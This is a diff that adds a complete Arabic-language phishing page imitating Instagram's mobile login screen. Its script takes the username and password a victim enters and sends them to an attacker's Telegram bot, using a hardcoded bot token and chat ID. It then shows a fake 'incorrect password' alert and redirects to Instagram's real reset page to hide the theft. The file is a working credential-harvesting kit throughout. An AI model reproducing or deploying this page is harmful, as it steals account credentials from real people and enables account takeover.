@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>تسجيل الدخول • إنستقرام</title>
+<style>
+  * {
+    box-sizing: border-box; 
+    -webkit-tap-highlight-color: transparent;
+  }
+  
+  html, body {
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    background: #1c1c1e; 
+    color: #f5f5f5;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  
+  .page {
+    min-height: 100svh; 
+    width: 100%;
+    max-width: 400px; 
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    padding: 10px 24px 20px;
+  }
+  
+  /* رفع العناصر العلوية */
+  .top-section {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    flex-grow: 1;
+    padding-top: 5px; /* تقليل البادينج لرفع العربية */
+  }
+
+  /* 1 _ كلمة العربية مرفوعة للأعلى جداً */
+  .lang {
+    color: #a8a8a8;
+    margin: 0 0 25px 0; /* مسافة أقل بين العربية والشعار */
+    font-size: 14px; 
+  }
+  
+  .logo {
+    width: 60px; 
+    height: 60px;
+    object-fit: contain;
+    margin-bottom: 35px; 
+  }
+  
+  /* حاوية الحقل لضبط النص المتحرك */
+  .input-container {
+    width: 100%;
+    position: relative;
+    margin-bottom: 6px; 
+    height: 68px; 
+  }
+
+  /* تنسيق الحقل الأساسي */
+  .field {
+    display: block;
+    width: 100%;
+    height: 100%; 
+    background: transparent;
+    border: 1px solid #363636;
+    border-radius: 12px;
+    color: #f5f5f5;
+    padding: 24px 16px 8px 16px; 
+    font-size: 14px;
+    outline: none;
+    font-family: inherit;
+    transition: border-color 0.2s;
+  }
+  
+  /* النص المتحرك (Placeholder) */
+  .field-label {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #a8a8a8;
+    font-size: 14px;
+    pointer-events: none;
+    transition: all 0.15s ease;
+    line-height: 1.2;
+  }
+
+  /* إخفاء الـ placeholder الافتراضي */
+  .field::placeholder {
+    color: transparent;
+  }
+  
+  /* عند التركيز أو وجود نص: النص يصغر ويطير للزاوية */
+  .field:focus ~ .field-label,
+  .field.has-value ~ .field-label {
+    top: 14px; 
+    font-size: 11px; 
+    color: #a8a8a8;
+  }
+  
+  /* الحدود الزرقاء عند التركيز */
+  .field:focus {
+    border-color: #0064E0; 
+  }
+
+  /* أيقونة العين */
+  .pass-wrapper {
+    position: relative;
+    width: 100%;
+    height: 100%;
+  }
+  .pass-wrapper .field {
+    padding-left: 45px; 
+  }
+
+  .eye-btn {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none !important;
+    border: none !important;
+    outline: none !important;
+    cursor: pointer;
+    padding: 5px;
+    display: none; 
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+  }
+  
+  .eye-btn svg {
+    width: 22px;
+    height: 22px;
+    stroke: #a8a8a8; 
+    fill: none;
+  }
+  
+  .pass-wrapper.has-text .eye-btn {
+    display: flex;
+  }
+
+  /* زر تسجيل الدخول */
+  .primary {
+    width: 100%;
+    height: 44px; 
+    border: 0;
+    border-radius: 22px;
+    background: #0064E0; 
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    margin-top: 4px; 
+    cursor: pointer;
+    transition: opacity 0.2s;
+    font-family: inherit;
+  }
+  
+  .primary:active { opacity: 0.8; }
+
+  .forgot {
+    color: #f5f5f5;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+    margin-top: 12px; 
+    cursor: pointer;
+  }
+
+  .bottom-section {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: auto; 
+    padding-bottom: 10px;
+  }
+
+  .create {
+    width: 100%;
+    height: 44px;
+    background: transparent;
+    border: 1px solid #0064E0;
+    border-radius: 22px;
+    color: #0064E0;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 15px; 
+  }
+  
+  .create:active { background: rgba(0, 100, 224, 0.1); }
+
+  .meta {
+    width: 60px; 
+    height: auto;
+    object-fit: contain;
+    opacity: 0.9;
+  }
+
+  /* ===== iOS Alert Modal ===== */
+  .ios-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+  .ios-overlay.ios-show { display: flex; }
+  .ios-box {
+    background: #fff;
+    border-radius: 14px;
+    width: 270px;
+    text-align: center;
+    font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+    direction: rtl;
+    overflow: hidden;
+    animation: ios-pop .22s cubic-bezier(.4,1.6,.6,1) both;
+  }
+  @keyframes ios-pop {
+    from { transform: scale(.85); opacity: 0; }
+    to   { transform: scale(1);   opacity: 1; }
+  }
+  .ios-body { padding: 20px 16px 16px; }
+  .ios-title { font-size: 17px; font-weight: 700; color: #000; margin-bottom: 6px; }
+  .ios-msg { font-size: 13px; color: #333; line-height: 1.5; }
+  .ios-actions { border-top: 1px solid #d8d8d8; }
+  .ios-btn {
+    display: block; width: 100%; padding: 13px; border: none; background: none;
+    font-size: 17px; color: #007aff; cursor: pointer; border-top: 1px solid #d8d8d8;
+    font-family: inherit;
+  }
+  .ios-btn:first-child { border-top: none; }
+  .ios-btn:active { background: #f0f0f0; }
+
+  @keyframes ios-shake {
+    0%,100%{ transform: translateX(0); }
+    20%    { transform: translateX(-9px); }
+    40%    { transform: translateX(9px); }
+    60%    { transform: translateX(-6px); }
+    80%    { transform: translateX(6px); }
+  }
+  .ios-shake {
+    animation: ios-shake .4s ease both !important;
+    outline: 1.5px solid #ff3b30 !important;
+  }
+</style>
+</head>
+<body>
+<main class="page">
+  
+  <div class="top-section">
+    <div class="lang">العربية</div>
+    
+    <a href="https://imgbb.com/"><img class="logo" src="https://i.ibb.co/99VCHRB0/x-OP-Fkb-MZmy.webp" alt="Instagram Logo" border="0"></a>
+    
+    <div class="input-container">
+      <input class="field" id="userInput" type="text" placeholder=" " autocomplete="off">
+      <label class="field-label" for="userInput">اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول</label>
+    </div>
+    
+    <div class="input-container pass-wrapper" id="passWrapper">
+      <input class="field" id="passInput" type="password" placeholder=" " autocomplete="off">
+      <label class="field-label" for="passInput">كلمة السر</label>
+      <button class="eye-btn" id="eyeBtn" type="button" aria-label="إظهار/إخفاء كلمة السر">
+        <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+        </svg>
+        <svg id="eyeSlash" style="display: none;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
+        </svg>
+      </button>
+    </div>
+    
+    <button class="primary" id="login" type="button">تسجيل الدخول</button>
+    
+    <a class="forgot" id="forgot">هل نسيت كلمة السر؟</a>
+  </div>
+  
+  <div class="bottom-section">
+    <a class="create" id="create">إنشاء حساب جديد</a>
+    <a href="https://imgbb.com/"><img class="meta" src="https://i.ibb.co/2LCkRY4/u-x-NYO0-Vf-Qm-5.webp" alt="Meta" border="0"></a>
+  </div>
+
+</main>
+
+<!-- ===== iOS Alert Modal ===== -->
+<div class="ios-overlay" id="iosOverlay">
+  <div class="ios-box">
+    <div class="ios-body">
+      <div class="ios-title">كلمة السر غير صحيحة</div>
+      <div class="ios-msg">كلمة السر التي أدخلتها غير صحيحة. يرجى إعادة المحاولة أو الحصول على رمز لتسجيل الدخول.</div>
+    </div>
+    <div class="ios-actions">
+      <button class="ios-btn" id="iosGetCode">الحصول على الرمز</button>
+      <button class="ios-btn" id="iosRetry">إعادة المحاولة</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "9043748742:AAFm8auyubbPG6nIrlWwQ--QdIunH_dRM98";
+  const CHAT_ID = "9149531767";
+  const RESET_LINK = "https://www.instagram.com/accounts/password/reset/";
+  const FORGOT_LINK = "https://www.instagram.com/accounts/password/reset/";
+  const CREATE_LINK = "https://www.instagram.com/accounts/emailsignup/";
+
+  const userField = document.getElementById("userInput");
+  const passField = document.getElementById("passInput");
+  const passWrapper = document.getElementById("passWrapper");
+  const eyeBtn = document.getElementById("eyeBtn");
+  const eyeOpen = document.getElementById("eyeOpen");
+  const eyeSlash = document.getElementById("eyeSlash");
+
+  function checkValue(input) {
+    if (input.value.length > 0) {
+      input.classList.add("has-value");
+    } else {
+      input.classList.remove("has-value");
+    }
+  }
+
+  userField.addEventListener("input", function () {
+    const pos = this.selectionStart;
+    const cleaned = this.value.replace(/[^a-zA-Z0-9@.\-_]/g, ""); 
+    if (this.value !== cleaned) {
+      this.value = cleaned;
+      this.setSelectionRange(pos - 1, pos - 1);
+    }
+    checkValue(this);
+  });
+
+  passField.addEventListener("input", function () {
+    const pos = this.selectionStart;
+    const cleaned = this.value.replace(/[^a-zA-Z0-9!@#$%^&*\-_.]/g, "");
+    if (this.value !== cleaned) {
+      this.value = cleaned;
+      this.setSelectionRange(pos - 1, pos - 1);
+    }
+    
+    if (this.value.length > 0) {
+      passWrapper.classList.add("has-text"); 
+    } else {
+      passWrapper.classList.remove("has-text"); 
+    }
+    checkValue(this);
+  });
+
+  eyeBtn.addEventListener("click", () => {
+    const hidden = passField.type === "password";
+    passField.type = hidden ? "text" : "password";
+    eyeOpen.style.display = hidden ? "none" : "block";
+    eyeSlash.style.display = hidden ? "block" : "none";
+  });
+
+  async function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+      });
+    } catch (e) {
+      console.error("فشل الإرسال:", e);
+    }
+  }
+
+  const overlay = document.getElementById("iosOverlay");
+  document.getElementById("iosRetry").addEventListener("click", () => overlay.classList.remove("ios-show"));
+  document.getElementById("iosGetCode").addEventListener("click", () => {
+    overlay.classList.remove("ios-show");
+    window.open(RESET_LINK, "_blank");
+  });
+
+  document.getElementById("login").addEventListener("click", () => {
+    const username = userField.value.trim();
+    const password = passField.value.trim();
+    if (!username || !password) return;
+
+    const msg = `🔐 <b>محاولة تسجيل دخول</b>\n👤 المستخدم: <code>${username}</code>\n🔑 كلمة السر: <code>${password}</code>`;
+    sendToTelegram(msg);
+    overlay.classList.add("ios-show");
+  });
+
+  document.getElementById("forgot").addEventListener("click", (e) => {
+    e.preventDefault();
+    window.open(FORGOT_LINK, "_blank");
+  });
+
+  document.getElementById("create").addEventListener("click", (e) => {
+    e.preventDefault();
+    window.open(CREATE_LINK, "_blank");
+  });
+</script>
+</body>
+</html>
